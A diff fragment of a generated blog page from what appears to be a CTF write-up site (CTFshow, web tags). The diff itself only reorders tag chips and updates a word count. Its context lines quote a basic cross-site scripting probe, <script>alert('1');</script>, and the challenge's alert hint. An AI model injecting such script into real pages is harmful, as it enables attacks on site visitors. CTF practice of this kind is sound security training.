 <pre><code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code></pre><p>源代码文件中得到：alert("Please use alert(HackingLab)!!");</p>
 <p>payload：</p>
@@ -1757,12 +1768,12 @@ if(isset($_GET[&#39;url&#39;])){
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTFshow/" target="_blank">
-                        <span class="chip bg-color">CTFshow</span>
-                    </a>
-                    
                     <a href="/tags/web/" target="_blank">
                         <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/CTFshow/" target="_blank">
+                        <span class="chip bg-color">CTFshow</span>
                     </a>
                     
                 </div>
@@ -2011,7 +2022,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">79.2k</span> 字
+                <span class="white-color">79.7k</span> 字
             
 
             
